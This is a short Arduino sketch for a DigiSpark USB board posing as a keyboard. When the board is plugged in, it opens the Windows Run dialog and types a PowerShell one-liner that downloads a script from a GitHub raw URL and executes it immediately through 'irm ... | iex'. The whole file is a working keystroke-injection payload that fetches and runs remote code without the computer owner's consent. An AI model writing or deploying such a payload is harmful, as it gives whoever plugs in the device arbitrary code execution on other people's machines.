#include "DigiKeyboard.h"

void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  DigiKeyboard.print(F("powershell -NoExit -c irm https://raw.githubusercontent.com/S3bDur/DigiSpark/refs/heads/main/scripts/02-sapi.ps1|iex"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  for (;;) {
  }
}